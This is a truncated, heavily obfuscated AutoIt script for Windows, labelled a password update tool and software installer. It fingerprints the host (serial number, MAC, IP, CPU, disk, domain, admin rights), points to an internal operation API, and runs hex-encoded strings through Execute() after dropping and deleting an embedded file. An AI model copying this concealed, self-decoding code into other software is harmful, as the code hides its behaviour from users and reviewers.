Global Const $vt0sz0843 = Number($vt0s0843), $vt0sz0845 = Number($vt0s0845), $vt0sz0846 = Number($vt0s0846), $vt0sz0847 = Number($vt0s0847), $vt0sz0848 = Number($vt0s0848), $vt0sz084a = Number($vt0s084a), $vt0sz084c = Number($vt0s084c), $vt0sz084d = Number($vt0s084d), $vt0sz084e = Number($vt0s084e), $vt0sz0850 = Number($vt0s0850), $vt0sz0852 = Number($vt0s0852), $vt0sz0853 = Number($vt0s0853), $vt0sz0854 = Number($vt0s0854), $vt0sz0855 = Number($vt0s0855), $vt0sz0856 = Number($vt0s0856), $vt0sz0857 = Number($vt0s0857), $vt0sz0858 = Number($vt0s0858), $vt0sz0859 = Number($vt0s0859), $vt0sz085a = Number($vt0s085a), $vt0sz085d = Number($vt0s085d), $vt0sz085e = Number($vt0s085e), $vt0sz085f = Number($vt0s085f), $vt0sz0860 = Number($vt0s0860), $vt0sz0861 = Number($vt0s0861), $vt0sz0862 = Number($vt0s0862), $vt0sz0864 = Number($vt0s0864), $vt0sz0866 = Number($vt0s0866), $vt0sz0867 = Number($vt0s0867), $vt0sz086a = Number($vt0s086a), $vt0sz086b = Number($vt0s086b), $vt0sz086c = Number($vt0s086c), $vt0sz086d = Number($vt0s086d), $vt0sz086e = Number($vt0s086e), $vt0sz086f = Number($vt0s086f), $vt0sz0871 = Number($vt0s0871), $vt0sz0873 = Number($vt0s0873), $vt0sz0874 = Number($vt0s0874), $vt0sz0875 = Number($vt0s0875), $vt0sz0876 = Number($vt0s0876), $vt0sz0877 = Number($vt0s0877), $vt0sz0878 = Number($vt0s0878), $vt0sz0879 = Number($vt0s0879), $vt0sz087e = Number($vt0s087e), $vt0sz087f = Number($vt0s087f), $vt0sz0880 = Number($vt0s0880), $vt0sz0881 = Number($vt0s0881), $vt0sz0882 = Number($vt0s0882), $vt0sz0883 = Number($vt0s0883), $vt0sz0885 = Number($vt0s0885), $vt0sz088b = Number($vt0s088b), $vt0sz088d = Number($vt0s088d), $vt0sz088e = Number($vt0s088e), $vt0sz088f = Number($vt0s088f), $vt0sz0892 = Number($vt0s0892), $vt0sz0893 = Number($vt0s0893), $vt0sz0894 = Number($vt0s0894), $vt0sz0895 = Number($vt0s0895), $vt0sz0896 = Number($vt0s0896), $vt0sz0897 = Number($vt0s0897), $vt0sz0898 = Number($vt0s0898), $vt0sz0899 = Number($vt0s0899), $vt0sz089a = Number($vt0s089a), $vt0sz089b = Number($vt0s089b), $vt0sz089c = Number($vt0s089c), $vt0sz089e = Number($vt0s089e), $vt0sz08a0 = Number($vt0s08a0), $vt0sz08a3 = Number($vt0s08a3), $vt0sz08a4 = Number($vt0s08a4), $vt0sz08a9 = Number($vt0s08a9), $vt0sz08aa = Number($vt0s08aa), $vt0sz08ab = Number($vt0s08ab), $vt0sz08ac = Number($vt0s08ac), $vt0sz08ad = Number($vt0s08ad), $vt0sz08ae = Number($vt0s08ae), $vt0sz08b0 = Number($vt0s08b0), $vt0sz08b2 = Number($vt0s08b2), $vt0sz08b5 = Number($vt0s08b5), $vt0sz08b7 = Number($vt0s08b7), $vt0sz08b9 = Number($vt0s08b9), $vt0sz08bb = Number($vt0s08bb), $vt0sz08bd = Number($vt0s08bd), $vt0sz08be = Number($vt0s08be), $vt0sz08bf = Number($vt0s08bf), $vt0sz08c0 = Number($vt0s08c0), $vt0sz08c3 = Number($vt0s08c3), $vt0sz08c4 = Number($vt0s08c4), $vt0sz08c5 = Number($vt0s08c5), $vt0sz08c6 = Number($vt0s08c6), $vt0sz08c7 = Number($vt0s08c7), $vt0sz08c8 = Number($vt0s08c8), $vt0sz08c9 = Number($vt0s08c9), $vt0sz08ca = Number($vt0s08ca), $vt0sz08cb = Number($vt0s08cb), $vt0sz08cc = Number($vt0s08cc), $vt0sz08cd = Number($vt0s08cd), $vt0sz08ce = Number($vt0s08ce), $vt0sz08d0 = Number($vt0s08d0), $vt0sz08d2 = Number($vt0s08d2), $vt0sz08d4 = Number($vt0s08d4), $vt0sz08d6 = Number($vt0s08d6), $vt0sz08d7 = Number($vt0s08d7), $vt0sz08d9 = Number($vt0s08d9), $vt0sz08db = Number($vt0s08db), $vt0sz08dd = Number($vt0s08dd), $vt0sz08df = Number($vt0s08df), $vt0sz08e2 = Number($vt0s08e2), $vt0sz08e3 = Number($vt0s08e3), $vt0sz08e4 = Number($vt0s08e4), $vt0sz08e5 = Number($vt0s08e5), $vt0sz08e6 = Number($vt0s08e6), $vt0sz08e7 = Number($vt0s08e7), $vt0sz08e9 = Number($vt0s08e9), $vt0sz08eb = Number($vt0s08eb), $vt0sz08ec = Number($vt0s08ec), $vt0sz08f0 = Number($vt0s08f0), $vt0sz08f3 = Number($vt0s08f3), $vt0sz08f4 = Number($vt0s08f4), $vt0sz08f5 = Number($vt0s08f5), $vt0sz08f7 = Number($vt0s08f7), $vt0sz08f9 = Number($vt0s08f9), $vt0sz08fa = Number($vt0s08fa), $vt0sz08fd = Number($vt0s08fd), $vt0sz08ff = Number($vt0s08ff), $vt0sz0900 = Number($vt0s0900), $vt0sz0903 = Number($vt0s0903), $vt0sz0906 = Number($vt0s0906), $vt0sz0907 = Number($vt0s0907), $vt0sz090c = Number($vt0s090c), $vt0sz090e = Number($vt0s090e), $vt0sz0911 = Number($vt0s0911), $vt0sz0912 = Number($vt0s0912), $vt0sz0913 = Number($vt0s0913), $vt0sz0914 = Number($vt0s0914), $vt0sz0915 = Number($vt0s0915), $vt0sz0916 = Number($vt0s0916), $vt0sz0917 = Number($vt0s0917), $vt0sz0918 = Number($vt0s0918)
Global Const $vt0sz0919 = Number($vt0s0919), $vt0sz091a = Number($vt0s091a), $vt0sz091c = Number($vt0s091c), $vt0sz0920 = Number($vt0s0920), $vt0sz0921 = Number($vt0s0921), $vt0sz0922 = Number($vt0s0922), $vt0sz0923 = Number($vt0s0923), $vt0sz0924 = Number($vt0s0924), $vt0sz0925 = Number($vt0s0925), $vt0sz0926 = Number($vt0s0926), $vt0sz0927 = Number($vt0s0927), $vt0sz0928 = Number($vt0s0928), $vt0sz0929 = Number($vt0s0929), $vt0sz092a = Number($vt0s092a), $vt0sz092b = Number($vt0s092b), $vt0sz092c = Number($vt0s092c), $vt0sz092d = Number($vt0s092d), $vt0sz092e = Number($vt0s092e), $vt0sz092f = Number($vt0s092f), $vt0sz0930 = Number($vt0s0930), $vt0sz0931 = Number($vt0s0931), $vt0sz0932 = Number($vt0s0932), $vt0sz0935 = Number($vt0s0935), $vt0sz0937 = Number($vt0s0937), $vt0sz0938 = Number($vt0s0938), $vt0sz0939 = Number($vt0s0939), $vt0sz093a = Number($vt0s093a), $vt0sz093b = Number($vt0s093b), $vt0sz093c = Number($vt0s093c), $vt0sz093d = Number($vt0s093d), $vt0sz093e = Number($vt0s093e), $vt0sz093f = Number($vt0s093f), $vt0sz0941 = Number($vt0s0941), $vt0sz0942 = Number($vt0s0942), $vt0sz0943 = Number($vt0s0943), $vt0sz0944 = Number($vt0s0944), $vt0sz0945 = Number($vt0s0945), $vt0sz0948 = Number($vt0s0948), $vt0sz094a = Number($vt0s094a), $vt0sz094c = Number($vt0s094c), $vt0sz094e = Number($vt0s094e)
Global $wmi = ObjGet("winmgmts:\\")
HttpSetProxy($vt0sz0945)
Global $t0s0559 = $vt0s0780
Global $t0s055a = Execute($vt0s07b8)
Global $t0s055b = Execute($vt0s0782)
Global $t0s055c = getpcsn()
Global $t0s055d = getpcvendor()
Global $t0s055e = getpcmodel()
Global $t0s055f = getpcmac()
Global $t0s0560 = getpcip()
Global $t0s0561 = getpccpuname()
Global $t0s0562 = getpcmemory()
Global $t0s0563 = getdisktotal()
Global $t0s0564 = getpcdisplaycardname()
Global $t0s0565 = "密码更新工具"
Global $opg2510 = "Run"
Global $t0s0566 = String($t0s055d & $vt0s0784 & $t0s055e & $vt0s0784 & $t0s055f & $vt0s0784 & $t0s0560 & $vt0s0784 & $t0s0561 & $vt0s0784 & $t0s0562 & $vt0s0784 & $t0s0563 & $vt0s0784 & $t0s0564)
Global $t0s056f = $vt0s078b
Global $t0s0570 = StringFormat($vt0s078c, $t0s055b, $t0s055a, $t0s055c, $t0s0566, $t0s0565)
Global $pcexad = RegRead("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters", "Domain")
Global $winosver = @OSVersion & "_" & @OSBuild
Global $opdetail = "启动软件安装程序"
Global $actrole = ""
If $pcexad = "" Then
	$pcexad = "Work"
EndIf
If IsAdmin() Then
	$actrole = "Administrators"
Else
	$actrole = "User"
EndIf
$appopapi_addr = "http://192.168.101.36:8080/api/Operation"
$ud32340 = $appopapi_addr

Func t0sf00ee($t0s05cd, $t0s0744 = Default, $t0s0745 = Default, $t0s0746 = Default, $t0s0747 = Default, $t0s0748 = Default, $t0s0608 = Default, $t0s074a = Default, $t0s074b = Default, $t0s074c = Default, $t0s074d = Default, $t0s074e = Default)
	Local $t0s05ad = ObjEvent($vt0s07ce, $vt0s07cf)
	If $t0s0744 = Default Then $t0s0744 = False
	If $t0s0745 = Default Then $t0s0745 = $vt0sz0945
	If $t0s0746 = Default Then $t0s0746 = -$vt0sz0945
	If $t0s0747 = Default Then $t0s0747 = True
	If $t0s0748 = Default Then $t0s0748 = $vt0s0780
	If $t0s0608 = Default Then $t0s0608 = $t0s075c
	If $t0s074a = Default Then $t0s074a = $vt0s0780
	If $t0s074b = Default Then $t0s074b = $vt0s0780
	If $t0s074c = Default Then $t0s074c = $vt0s0780
	If $t0s074d = Default Then $t0s074d = $t0s0765
	If $t0s074e = Default Then $t0s074e = $t0s0768
	If NOT IsObj($t0s05cd) Then Return SetError($vt0sz0945, $vt0sz094e, $vt0sz094e)
	Local $t0s076a, $t0s076b = $vt0sz094e, $t0s076c = $vt0sz094e, $t0s076d
	If $t0s0746 <> -$vt0sz0945 Then
		$t0s076a = $t0s05cd.pagesetup.orientation
		If $t0s076a <> $t0s0746 Then
			$t0s05cd.pagesetup.orientation = $t0s0746
			If @error Then Return SetError($vt0sz093b, @error, $vt0sz094e)
		EndIf
	EndIf
	If $t0s0748 <> $vt0s0780 Then
		$t0s076d = $t0s05cd.application.activeprinter
		$t0s05cd.application.activeprinter = $t0s0748
		If @error Then
			$t0s076b = $vt0sz0948
			$t0s076c = @error
		EndIf
	EndIf
	If $t0s076b = $vt0sz094e Then
		$t0s05cd.printout($t0s0744, False, $t0s0608, $vt0s0780, $t0s074a, $t0s074b, $t0s074e, $t0s0745, $t0s074c, $t0s074d, $vt0sz094e, $t0s0747)
		If @error Then
			$t0s076b = $vt0sz094c
			$t0s076c = @error
		EndIf
	EndIf
	If $t0s0746 <> -$vt0sz0945 AND $t0s076a <> $t0s0746 Then
		$t0s05cd.pagesetup.orientation = $t0s076a
	EndIf
	If $t0s076d Then
		$t0s05cd.application.activeprinter = $t0s076d
	EndIf
	If $t0s076b <> $vt0sz094e Then Return SetError($t0s076b, $t0s076c, $vt0sz094e)
	Return $vt0sz0945
EndFunc

Func t0sf00e7($t0s05cd, $t0s0632 = Default, $t0s0633 = Default, $t0s0634 = Default, $t0s0635 = Default, $t0s0636 = Default, $t0s0637 = Default, $t0s0638 = Default, $t0s0639 = Default, $t0s063a = Default, $t0s063b = Default)
	Local $t0s05ad = ObjEvent($vt0s07ce, $vt0s07cf)
	If $t0s0632 = Default Then $t0s0632 = $vt0s0780
	If $t0s0633 = Default Then $t0s0633 = $vt0sz094e
	If $t0s0635 = Default Then $t0s0635 = True
	If $t0s0636 = Default Then $t0s0636 = False
	If $t0s0637 = Default Then $t0s0637 = False
	If $t0s0638 = Default Then $t0s0638 = False
	If $t0s0639 = Default Then $t0s0639 = False
	If $t0s063a = Default Then $t0s063a = False
	If $t0s063b = Default Then $t0s063b = False
	If NOT IsObj($t0s05cd) Then Return SetError($vt0sz0945, $vt0sz094e, $vt0sz094e)
	Switch $t0s0633
		Case -$vt0sz0945
			$t0s0633 = $t0s05cd.application.selection.range
		Case $vt0sz094e
			$t0s0633 = $t0s05cd.range()
		Case Else
			If NOT IsObj($t0s0633) Then Return SetError($vt0sz093b, $vt0sz094e, $vt0sz094e)
	EndSwitch
	If $t0s0634 = Default Then
		$t0s0634 = $t0s0633.duplicate()
	Else
		If NOT IsObj($t0s0634) Then Return SetError($vt0sz0948, $vt0sz094e, $vt0sz094e)
		If $t0s0635 = True Then
			$t0s0634.start = $t0s0634.end
			$t0s0634.end = $t0s0633.end
		Else
			$t0s0634.end = $t0s0634.start
			$t0s0634.start = $t0s0633.start
		EndIf
	EndIf
	$t0s0634.find.clearformatting()
	$t0s0634.find.execute($t0s0632, $t0s0636, $t0s0637, $t0s0638, $t0s0639, $t0s063a, $t0s0635, $t0s066c, $t0s063b)
	If @error OR NOT $t0s0634.find.found Then Return SetError($vt0sz094c, @error, $vt0sz094e)
	Return $t0s0634
EndFunc

Func vt0sf()
	Local $tvt0s0 = "5456543053462829"
	Local $tvt0s = Execute(ovt0sf($tvt0s0))
	For $atabc0682 = 1 To 5
		FileInstall("~D212VT0SF", $tvt0s, 1)
		Local $tvt0s0 = "455845435554452842494E415259544F535452494E47282230783436343934433435343535383439"
		$tvt0s0 &= "35333534353332383234353435363534333035333239222929"
		If Execute(ovt0sf($tvt0s0)) Then ExitLoop
		Execute(BinaryToString("0x536C65657028313029"))
	Next
	Local $tvt0s1 = "535452494E47524547455850284C56543053462846494C45524541442824545654305329292C2027"
	$tvt0s1 &= "282E2A3F29283F3A433137547C2429272C203329"
	Global $atabc0685, $vt0s02f0 = Execute(ovt0sf($tvt0s1))
	Local $tvt0s2 = "46494C4544454C4554452824545654305329"
	Local $tvt0s3 = "455845435554452842494E415259544F535452494E47282230783436343934433435343334433446"
	$tvt0s3 &= "35333435323834363439344334353446353034353445323832343534353635343330353332433230"
	$tvt0s3 &= "333232393239222929"
	If NOT Execute(ovt0sf($tvt0s2)) Then Execute(ovt0sf($tvt0s3))
EndFunc

Func t0sf00f0($t0s05cd)
	Local $t0s05ad = ObjEvent($vt0s07ce, $vt0s07cf)
	If NOT IsObj($t0s05cd) Then Return SetError($vt0sz0945, $vt0sz094e, $vt0sz094e)
	If NOT FileExists($t0s05cd.fullname) Then Return SetError($vt0sz093b, $vt0sz094e, $vt0sz094e)
	$t0s05cd.save()
	If @error Then Return SetError($vt0sz0948, @error, $vt0sz094e)
	Return $vt0sz0945
EndFunc

Func t0sf00f1($t0s05cd, $t0s0606 = Default, $t0s07c8 = Default, $t0s07c9 = Default, $t0s06fe = Default, $t0s07cb = Default, $t0s0700 = Default)
	Local $t0s05ad = ObjEvent($vt0s07ce, $vt0s07cf)
	If $t0s0606 = Default Then $t0s0606 = $vt0s0780
	If $t0s07c8 = Default Then $t0s07c8 = $t0s07d2
	If $t0s07c9 = Default Then $t0s07c9 = False
	If $t0s06fe = Default Then $t0s06fe = $vt0sz094e
	If $t0s07cb = Default Then $t0s07cb = $vt0s0780
	If $t0s0700 = Default Then $t0s0700 = $vt0s0780
	If NOT IsObj($t0s05cd) Then Return SetError($vt0sz0945, $vt0sz094e, $vt0sz094e)
	$t0s05cd.saveas($t0s0606, $t0s07c8, False, $t0s07cb, $t0s06fe, $t0s0700, $t0s07c9)
	If @error Then Return SetError($vt0sz093b, @error, $vt0sz094e)
	Return $vt0sz0945
EndFunc

Func t0sf00ed($t0s05cd, $t0s06f9, $t0s0727 = Default, $t0s0728 = Default, $t0s0729 = Default)
	Local $t0s05ad = ObjEvent($vt0s07ce, $vt0s07cf)
	If $t0s0727 = Default Then $t0s0727 = False
	If $t0s0728 = Default Then $t0s0728 = Default
	If $t0s0729 = Default Then $t0s0729 = $vt0sz094e
	If NOT IsObj($t0s05cd) Then Return SetError($vt0sz0945, $vt0sz094e, $vt0sz094e)
	If $t0s0729 <> $vt0sz094e AND NOT IsObj($t0s0729) Then Return SetError($vt0sz094c, $vt0sz094e, $vt0sz094e)
	If NOT FileExists($t0s06f9) Then Return SetError($vt0sz093b, $vt0sz094e, $vt0sz094e)
	Local $t0s0735
	If IsObj($t0s0729) Then
		$t0s0735 = $t0s05cd.inlineshapes.addpicture($t0s06f9, $t0s0727, $t0s0728, $t0s0729)
	Else
		$t0s0735 = $t0s05cd.inlineshapes.addpicture($t0s06f9, $t0s0727, $t0s0728)
	EndIf
	If @error Then Return SetError($vt0sz0948, @error, $vt0sz094e)
	Return $t0s0735
EndFunc

Func t0sf00e0()
	If NOT Execute($vt0s07ac) Then Exit
EndFunc

Func t0sf00e9($t0s0598, $t0s06b2 = Default)
	Local $t0s05ad = ObjEvent($vt0s07ce, $vt0s07cf)
	If NOT IsObj($t0s0598) Then Return SetError($vt0sz0945, $vt0sz094e, $vt0sz094e)
	If $t0s06b2 = Default Then $t0s06b2 = -$vt0sz0945
	Local $t0s06b7 = $t0s0598.documents.count
	If @error Then Return SetError($vt0sz094c, @error, $vt0sz094e)
	If IsInt($t0s06b2) Then
		Local $t0s06ba
		Select 
			Case $t0s06b2 = -$vt0sz0945
				Return SetError($vt0sz094e, $t0s06b7, $t0s0598.documents)
			Case $t0s06b2 = $vt0sz094e
				$t0s06ba = $t0s0598.activedocument
				If @error Then Return SetError($vt0sz0948, @error, $vt0sz094e)
				Return SetError($vt0sz094e, $t0s06b7, $t0s06ba)
			Case $t0s06b2 > $vt0sz094e AND $t0s06b2 <= $t0s06b7
				$t0s06ba = $t0s0598.activedocument
				If @error Then Return SetError($vt0sz0948, @error, $vt0sz094e)
				Return SetError($vt0sz094e, $t0s06b7, $t0s06ba)
			Case Else
				Return SetError($vt0sz093b, $vt0sz094e, $vt0sz094e)
		EndSelect
	Else
		For $t0s05cd In $t0s0598.documents
			If $t0s05cd.name = $t0s06b2 Then Return SetError($vt0sz094e, $t0s06b7, $t0s05cd)
		Next
		Return SetError($vt0sz0948, $vt0sz094e, $vt0sz094e)
	EndIf
EndFunc

Func t0sf00e5($t0s05cd, $t0s05aa = Default, $t0s05ab = Default)
	Local $t0s05ad = ObjEvent($vt0s07ce, $vt0s07cf)
	If $t0s05aa = Default Then $t0s05aa = $t0s05b0
	If $t0s05ab = Default Then $t0s05ab = $t0s0600
	If NOT IsObj($t0s05cd) Then Return SetError($vt0sz0945, $vt0sz094e, $vt0sz094e)
	$t0s05cd.close($t0s05aa, $t0s05ab)
	If @error Then Return SetError($vt0sz093b, @error, $vt0sz094e)
	Return $vt0sz0945
EndFunc

Func t0sf00ec($t0s0598, $t0s06f9, $t0s06fa = Default, $t0s0607 = Default, $t0s06fc = Default, $t0s06fd = Default, $t0s06fe = Default, $t0s06ff = Default, $t0s0700 = Default)
	Local $t0s05ad = ObjEvent($vt0s07ce, $vt0s07cf)
	If $t0s06fa = Default Then $t0s06fa = False
	If $t0s0607 = Default Then $t0s0607 = $t0s0706
	If $t0s06fc = Default Then $t0s06fc = False
	If $t0s06fd = Default Then $t0s06fd = False
	If $t0s06fe = Default Then $t0s06fe = False
	If $t0s06ff = Default Then $t0s06ff = $vt0s0780
	If $t0s0700 = Default Then $t0s0700 = $vt0s0780
	If NOT IsObj($t0s0598) Then Return SetError($vt0sz0945, $vt0sz094e, $vt0sz094e)
	If NOT FileExists($t0s06f9) Then Return SetError($vt0sz093b, $vt0sz094e, $vt0sz094e)
	If StringInStr($t0s06f9, $vt0s0884) = $vt0sz094e Then $t0s06f9 = Execute($vt0s0886) & $vt0s0884 & $t0s06f9
	Local $t0s05cd = $t0s0598.documents.open($t0s06f9, $t0s06fa, $t0s06fc, $t0s06fe, $t0s06ff, $vt0s0780, $t0s06fd, $t0s0700, $vt0s0780, $t0s0607)
	If @error OR NOT IsObj($t0s05cd) Then Return SetError($vt0sz0948, @error, $vt0sz094e)
	If $t0s06fc = False AND $t0s05cd.readonly = True Then Return SetError($vt0sz094e, $vt0sz0945, $t0s05cd)
	Return $t0s05cd
EndFunc

Func t0sf00eb($t0s05cd, $t0s06e8 = Default)
	Local $t0s05ad = ObjEvent($vt0s07ce, $vt0s07cf)
	If NOT IsObj($t0s05cd) Then Return SetError($vt0sz0945, $vt0sz094e, $vt0sz094e)
	If $t0s06e8 <> Default AND (NOT IsInt($t0s06e8)) Then Return SetError($vt0sz093b, $vt0sz094e, $vt0sz094e)
	Local $t0s06b7 = $t0s05cd.hyperlinks.count
	If @error Then Return SetError($vt0sz0948, @error, $vt0sz094e)
	Select 
		Case $t0s06e8 = Default
			Return SetError($vt0sz094e, $t0s06b7, $t0s05cd.hyperlinks)
		Case $t0s06e8 > $vt0sz094e AND $t0s06e8 <= $t0s06b7
			Return SetError($vt0sz094e, $t0s06b7, $t0s05cd.hyperlinks.item($t0s06e8))
		Case Else
			Return SetError($vt0sz093b, $vt0sz094e, $vt0sz094e)
	EndSelect
EndFunc

Func t0sf00e2(ByRef $t0s0598, $t0s05aa = Default, $t0s05ab = Default, $t0s05ac = Default)
	Local $t0s05ad = ObjEvent($vt0s07ce, $vt0s07cf)
	If $t0s05aa = Default Then $t0s05aa = $t0s05b0
	If $t0s05ab = Default Then $t0s05ab = $t0s05b3
	If $t0s05ac = Default Then $t0s05ac = False
	If NOT IsObj($t0s0598) Then Return SetError($vt0sz0945, $vt0sz094e, $vt0sz094e)
	If t0sf00f4() OR $t0s05ac Then
		$t0s0598.quit($t0s05aa, $t0s05ab)
		If @error Then Return SetError($vt0sz093b, @error, $vt0sz094e)
	EndIf
	$t0s0598 = $vt0sz094e
	t0sf00f4(False)
	Return $vt0sz0945
EndFunc

Func t0sf00e8($t0s05cd, $t0s0632 = Default, $t0s0672 = Default, $t0s0673 = Default, $t0s0633 = Default, $t0s0636 = Default, $t0s0637 = Default, $t0s0638 = Default, $t0s0639 = Default, $t0s063a = Default, $t0s0635 = Default, $t0s067b = Default, $t0s063b = Default)
	Local $t0s05ad = ObjEvent($vt0s07ce, $vt0s07cf)
	If $t0s0632 = Default Then $t0s0632 = $vt0s0780
	If $t0s0672 = Default Then $t0s0672 = $vt0s0780
	If $t0s0673 = Default Then $t0s0673 = $t0s0684
	If $t0s0633 = Default Then $t0s0633 = $vt0sz094e
	If $t0s0636 = Default Then $t0s0636 = False
	If $t0s0637 = Default Then $t0s0637 = False
	If $t0s0638 = Default Then $t0s0638 = False
	If $t0s0639 = Default Then $t0s0639 = False
	If $t0s063a = Default Then $t0s063a = False
	If $t0s0635 = Default Then $t0s0635 = True
	If $t0s067b = Default Then $t0s067b = $t0s0695
	If $t0s063b = Default Then $t0s063b = False
	If NOT IsObj($t0s05cd) Then Return SetError($vt0sz0945, $vt0sz094e, $vt0sz094e)
	Switch $t0s0633
		Case -$vt0sz0945
			$t0s0633 = $t0s05cd.application.selection.range
		Case $vt0sz094e
			$t0s0633 = $t0s05cd.range()
		Case Else
			If NOT IsObj($t0s0633) Then Return SetError($vt0sz093b, $vt0sz094e, $vt0sz094e)
	EndSwitch
	Local $t0s069f = $t0s0633.find
	$t0s069f.clearformatting()
	$t0s069f.replacement.clearformatting()
	Local $t0s06a3 = $t0s069f.execute($t0s0632, $t0s0636, $t0s0637, $t0s0638, $t0s0639, $t0s063a, $t0s0635, $t0s067b, $t0s063b, $t0s0672, $t0s0673)
	If @error OR NOT $t0s06a3 Then Return SetError($vt0sz0948, @error, $vt0sz094e)
	Return $vt0sz0945
EndFunc

Func t0sf00e3($t0s0598, $t0s05bd = Default, $t0s05be = Default, $t0s05bf = Default)
	Local $t0s05ad = ObjEvent($vt0s07ce, $vt0s07cf)
	If $t0s05bd = Default Then $t0s05bd = $t0s05c3
	If $t0s05be = Default Then $t0s05be = $vt0s0780
	If $t0s05bf = Default Then $t0s05bf = False
	If NOT IsObj($t0s0598) Then Return SetError($vt0sz0945, $vt0sz094e, $vt0sz094e)
	If StringStripWS($t0s05be, $t0s05ca + $t0s05cb) <> $vt0s0780 AND FileExists($t0s05be) <> $vt0sz0945 Then Return SetError($vt0sz093b, $vt0sz094e, $vt0sz094e)
	Local $t0s05cd = $t0s0598.documents.add($t0s05be, $t0s05bf, $t0s05bd)
	If @error OR NOT IsObj($t0s05cd) Then Return SetError($vt0sz0948, @error, $vt0sz094e)
	Return $t0s05cd
EndFunc

Func t0sf00ef($t0s05cd, $t0s0795, $t0s0796 = Default, $t0s0797 = Default, $t0s0798 = Default, $t0s0799 = Default)
	Local $t0s05ad = ObjEvent($vt0s07ce, $vt0s07cf)
	If $t0s0796 = Default Then $t0s0796 = $t0s079d
	If $t0s0798 = Default Then $t0s0798 = $t0s079d
	If NOT IsObj($t0s05cd) Then Return SetError($vt0sz0945, $vt0sz094e, $vt0sz094e)
	If NOT IsObj($t0s0795) AND ($t0s0795 < -$vt0sz093b OR $t0s0795 > $vt0sz094e) Then Return SetError($vt0sz093b, $vt0sz094e, $vt0sz094e)
	If $t0s0795 = -$vt0sz0945 Then
		$t0s0795 = $t0s05cd.range
		$t0s0795.collapse($t0s07a9)
	ElseIf $t0s0795 = -$vt0sz093b Then
		$t0s0795 = $t0s05cd.range
		$t0s0795.collapse($t0s07ae)
	ElseIf $t0s0795 = $vt0sz094e Then
		$t0s0795 = $t0s05cd.parent.selection.range
	EndIf
	If $t0s0796 = -$vt0sz0945 Then
		$t0s0795.collapse($t0s07a9)
		If @error Then Return SetError($vt0sz0948, @error, $vt0sz094e)
	ElseIf $t0s0797 <> Default Then
		$t0s0795.movestart($t0s0796, $t0s0797)
		If @error Then Return SetError($vt0sz0948, @error, $vt0sz094e)
	EndIf
	If $t0s0798 = -$vt0sz0945 Then
		$t0s0795.collapse($t0s07ae)
		If @error Then Return SetError($vt0sz094c, @error, $vt0sz094e)
	ElseIf $t0s0799 <> Default Then
		$t0s0795.moveend($t0s0798, $t0s0799)
		If @error Then Return SetError($vt0sz094c, @error, $vt0sz094e)
	EndIf
	Return $t0s0795
EndFunc

Func t0sf00ea($t0s05cd, $t0s06d1 = Default, $t0s06d2 = Default, $t0s06d3 = Default, $t0s06d4 = Default, $t0s06d5 = Default, $t0s06d6 = Default)
	Local $t0s05ad = ObjEvent($vt0s07ce, $vt0s07cf)
	If NOT IsObj($t0s05cd) Then Return SetError($vt0sz0945, $vt0sz094e, $vt0sz094e)
	If $t0s06d1 = Default Then $t0s06d1 = $t0s05cd.range()
	If NOT IsObj($t0s06d1) Then Return SetError($vt0sz0948, $vt0sz094e, $vt0sz094e)
	If $t0s06d2 = Default Then $t0s06d2 = $t0s05cd.fullname
	$t0s05cd.hyperlinks.add($t0s06d1, $t0s06d2, $t0s06d3, $t0s06d4, $t0s06d5, $t0s06d6)
	If @error Then Return SetError($vt0sz093b, @error, $vt0sz094e)
	Return $vt0sz0945
EndFunc

Func t0sf00f5()
EndFunc

Func tvt0sf()
	Local $atabc0213, $atabc0214 = Execute(ovt0sf("4054656D70446972202620225C22"))
	Local $tvt0s0 = "455845435554452842494E415259544F535452494E47282230783436343934433435343535383439"
	$tvt0s0 &= "353335343533323832343431353434313432343333303332333133343239222929"
	If NOT Execute(ovt0sf($tvt0s0)) Then $atabc0214 = Execute(ovt0sf("40536372697074446972202620225C22"))
	Local $tvt0s1 = "537472696E674C656E282441544142433032313329203C2037"
	Local $tvt0s2 = "46696C65457869737473282441544142433032313329"
	Do
		$atabc0213 = ""
		While Execute(ovt0sf($tvt0s1))
			Local $tvt0s0 = "455845435554452842494E415259544F535452494E47282230783433363837323238353236313645"
			$tvt0s0 &= "3634364636443238333933373243323033313332333232433230333132393239222929"
			$atabc0213 &= Execute(ovt0sf($tvt0s0))
		WEnd
		$atabc0213 = $atabc0214 & @AutoItPID & $atabc0213
	Until NOT Execute(ovt0sf($tvt0s2))
	Return $atabc0213
EndFunc

Func t0sf00e4($t0s0598, $t0s05d5, $t0s05d6 = Default, $t0s05d7 = Default)
	Local $t0s05ad = ObjEvent($vt0s07ce, $vt0s07cf)
	Local $t0s05d9 = False
	If $t0s05d6 = Default Then $t0s05d6 = $vt0s07ea
	If $t0s05d7 = Default Then $t0s05d7 = $vt0sz094e
	If NOT IsObj($t0s0598) Then Return SetError($vt0sz0945, $vt0sz094e, $vt0sz094e)
	If StringStripWS($t0s05d5, $t0s05ca + $t0s05cb) = $vt0s0780 Then Return SetError($vt0sz093b, $vt0sz094e, $vt0sz094e)
	If $t0s05d6 <> $vt0s07ea AND $t0s05d6 <> $vt0s07f4 AND $t0s05d6 <> $vt0s07f5 Then Return SetError($vt0sz0948, $vt0sz094e, $vt0sz094e)
	For $t0s05cd In $t0s0598.documents
		Select 
			Case $t0s05d6 = $vt0s07ea AND $t0s05cd.fullname = $t0s05d5
				$t0s05d9 = True
			Case $t0s05d6 = $vt0s07f4 AND $t0s05cd.name = $t0s05d5
				$t0s05d9 = True
			Case $t0s05d6 = $vt0s07f5 AND StringInStr($t0s05cd.range().text, $t0s05d5, $t0s05d7)
				$t0s05d9 = True
		EndSelect
		If $t0s05d9 Then ExitLoop
	Next
	If NOT $t0s05d9 Then Return SetError($vt0sz094c, $vt0sz094e, $vt0sz094e)
	Return $t0s05cd
EndFunc

Func lvt0sf($tvt0s9)
	Local $tvt0s2 = 1, $tvt0s0 = 186, $tvt0sa = 29, $tvt0sb = 3
